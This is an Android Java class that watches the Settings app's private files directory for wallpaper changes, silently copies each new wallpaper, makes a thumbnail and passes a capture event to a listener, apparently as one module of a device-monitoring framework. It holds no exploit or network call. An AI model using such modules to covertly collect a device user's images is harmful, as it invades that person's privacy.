package com.vvt.capture.wallpaper;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.FileObserver;
import android.util.Log;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxWallPaperThumbnailEvent;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.FxOperationNotAllowedException;
import com.vvt.ioutil.Path;
import com.vvt.logger.FxLog;

public class FxWallpaperCapture  {
	public static final String DATE_FORMAT = "dd/MM/yy HH:mm:ss";

	private static final String TAG = "FxWallpaperCapture";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final File WALLPAPER_DIR = new File("/data/data/com.android.settings/files");
    private static final String WALLPAPER = "wallpaper";
    private static final File WALLPAPER_FILE = new File(WALLPAPER_DIR, WALLPAPER);
    
	private Context mContext;
	private String mWritablepath;
	private FxEventListener mFxEventListner;
	private boolean mIsWorking;
	
	final Object mLock = new Object[0];
	
	public FxWallpaperCapture(Context context, String writablePath) {
		mContext = context;
		mWritablepath = writablePath;
	}
	
	public void register(FxEventListener eventListner) {
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		this.mFxEventListner = eventListner;
		if(LOGV) FxLog.v(TAG, "register # EXIT ...");
	}
	
	public void unregister() throws FxOperationNotAllowedException {
		if(LOGV) FxLog.v(TAG, "unregister # ENTER ...");
		if(!mIsWorking) {
			//set the eventhandler to null to avoid memory leaks
			mFxEventListner = null;
		} else {
			throw new FxOperationNotAllowedException("Capturing is working, please call stopCapture before unregister.");
		}
		
		if(LOGV) FxLog.v(TAG, "unregister # EXIT ...");
	}
	
	public void startCapture() throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "startObserver # ENTER ...");
		
		if(mFxEventListner == null)
			throw new FxNullNotAllowedException("eventListner can not be null");
		
		if(mContext == null)
			throw new FxNullNotAllowedException("Context context can not be null");
		
		if(mWritablepath == null || mWritablepath == "")
			throw new FxNullNotAllowedException("Writablepath context can not be null or empty");
		
		if (!mIsWorking) {
			mIsWorking = true;
			mWallpaperObserver.startWatching();
		}
		
		if(LOGV) FxLog.v(TAG, "startObserver # EXIT ...");
	}
	 
	/*The CREATE is triggered when there is no
     * wallpaper set and is created for the first time. The CLOSE_WRITE is triggered
     * everytime the wallpaper is changed.
     */
	
	private final FileObserver mWallpaperObserver = new FileObserver(
			WALLPAPER_DIR.getAbsolutePath(), FileObserver.CREATE  | FileObserver.CLOSE_WRITE ) {
		@Override
		public void onEvent(int event, String path) {
			if(LOGV) FxLog.v(TAG, "onEvent # event:" + event);
			
			if (path == null) {
				if(LOGD) FxLog.d(TAG, "onEvent # path is null, bailing ..");
				return;
			}
			
			File changedFile = new File(WALLPAPER_DIR, path);
			if (WALLPAPER_FILE.equals(changedFile)) {
				if(LOGV) FxLog.v(TAG, "onEvent # ENTER ...");
				
				// Wait..
				try {
					if(LOGV) Log.v(TAG, "Wallpaper changed, Sleeping for 5 secs");
					Thread.sleep(5000);
				} catch (InterruptedException e1) {
					if(LOGE) FxLog.e(TAG, e1.toString());
				}
				
				if(LOGV) FxLog.v(TAG, "Wallpaper changed");
				
				try {
					
				    Bitmap bitmap = BitmapFactory.decodeFile(changedFile.getAbsolutePath());
				    
				    if(bitmap == null) {
				    	if(LOGE) FxLog.e(TAG, "bitmap is null, bailing ..");
						return;
				    }
					
				    if(LOGV) Log.v(TAG, "wallpaperDrawable is not null");
					 
					 /*Bitmap map1 = ((BitmapDrawable) wallpaperDrawable).getBitmap();*/
					 ByteArrayOutputStream baos = new ByteArrayOutputStream();
					 bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
					 
					 if(LOGV) Log.v(TAG, "wallpaperDrawable compress compeleted");

					 byte[] b = baos.toByteArray();
					 String filePath = getWallpaperFileName();
					 String originatedFileName =  new StringBuilder().append(filePath).append(".png").toString();
					 String thumbnailFileName = new StringBuilder().append(filePath).append(".thumb.jpg").toString();
					 
					 if(LOGV) Log.v(TAG, "originatedFileName:" + originatedFileName);
					 if(LOGV) Log.v(TAG, "thumbnailFileName:" + thumbnailFileName);
					 
					 try {
						 FileOutputStream os = new FileOutputStream(originatedFileName, true);
						 os.write(b);
						 os.close();
						 
						 // Generate thumbnail.
						 boolean isSuccess = generateThumbnailImage(originatedFileName, thumbnailFileName);
						 
						 if(LOGV) Log.v(TAG, "generateThumbnailImage: " + isSuccess);
						 
						 if(isSuccess) {
							 File f = new File(thumbnailFileName);
							 
							 if(f.exists()) {
								 // Insert this into local db.
								 FxWallPaperThumbnailEvent fxWallPaperThumbnailEvent = new FxWallPaperThumbnailEvent();
								 fxWallPaperThumbnailEvent.setActualSize(f.length());
								 fxWallPaperThumbnailEvent.setEventTime(System.currentTimeMillis());
								 fxWallPaperThumbnailEvent.setFormat(FxMediaType.JPEG);
								 fxWallPaperThumbnailEvent.setActualFullPath(originatedFileName);
								 fxWallPaperThumbnailEvent.setThumbnailFullPath(thumbnailFileName);
								 									 
								 if(LOGV) Log.v(TAG, "fxWallPaperThumbnailEvent: " + fxWallPaperThumbnailEvent);
								 
								 if(mFxEventListner != null) {
									 List<FxEvent> events = new ArrayList<FxEvent>(); 
									 events.add(fxWallPaperThumbnailEvent);
									 
									 mFxEventListner.onEventCaptured(events);
									 if(LOGV) Log.v(TAG, "fxWallPaperThumbnailEvent delivered.");
								 }
								 else {
									 if(LOGE) FxLog.e(TAG, "mFxEventListner is null");
								 }
							 }
							 else {
								 if(LOGD) FxLog.d(TAG, "file:" + f.getAbsolutePath() + " does not exisit");
							 }
						 }

					} catch (FileNotFoundException e) {
						if(LOGE) FxLog.e(TAG, e.getLocalizedMessage(), e);
					} catch (IOException e) {
						if(LOGE) FxLog.e(TAG, e.getLocalizedMessage(), e);
					}
				}
				catch (Throwable t) {
					if(LOGE) FxLog.e(TAG, t.getLocalizedMessage(), t);
				} 
				
				if(LOGV) FxLog.v(TAG, "onEvent # EXIT ...");
		}
			
		}
	};
	
	private boolean generateThumbnailImage(String originatedFileName, String thumbnailFileName) {
		if(LOGV) FxLog.v(TAG, "generateThumbnailImage # START");
		if(LOGV) FxLog.v(TAG, "generateThumbnailImage # originatedFileName " + originatedFileName );
		if(LOGV) FxLog.v(TAG, "generateThumbnailImage # thumbnailFileName " + thumbnailFileName );
		
		byte[] imageData = null;
		boolean ret = false;
		
		try {

			final int THUMBNAIL_SIZE = 64;

			FileInputStream fis = new FileInputStream(originatedFileName);
			Bitmap imageBitmap = BitmapFactory.decodeStream(fis);

			Float width = new Float(imageBitmap.getWidth());
			Float height = new Float(imageBitmap.getHeight());
			Float ratio = width / height;
			imageBitmap = Bitmap.createScaledBitmap(imageBitmap,
					(int) (THUMBNAIL_SIZE * ratio), THUMBNAIL_SIZE, false);

			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			imageBitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
			imageData = baos.toByteArray();
			
			FileOutputStream os = new FileOutputStream(thumbnailFileName, true);
			os.write(imageData);
			os.close();
			baos.close();

			ret = true;
			
		} catch (Exception ex) {
			if(LOGE) FxLog.e(TAG, ex.getMessage(), ex);
			ret = false;
		}
		
		if(LOGV) FxLog.v(TAG, "generateThumbnailImage # EXIT");
		return ret;
	}
	
	private String getWallpaperFileName(){
		File file = null;
		String refIdFolder = Path.combine(mWritablepath, WALLPAPER);
		file = new File(refIdFolder);
		 
		if(!file.exists()){
			file.mkdirs();
		}
		
	    UUID rnd = UUID.randomUUID();
	    String tmpFileName = rnd.toString();
	        		
		return (Path.combine(refIdFolder, tmpFileName));
	}
	
	@Override
    protected void finalize() throws Throwable {
		if(LOGD) FxLog.d(TAG, "finalize # called ...");
		
        super.finalize();
        mWallpaperObserver.stopWatching();
    }
	
	public void stopCapture() {
		if(LOGV) FxLog.v(TAG, "stopCapture # START");
		mIsWorking = false;
		mWallpaperObserver.stopWatching();
		if(LOGV) FxLog.v(TAG, "stopCapture # EXIT");
	}

	 
}
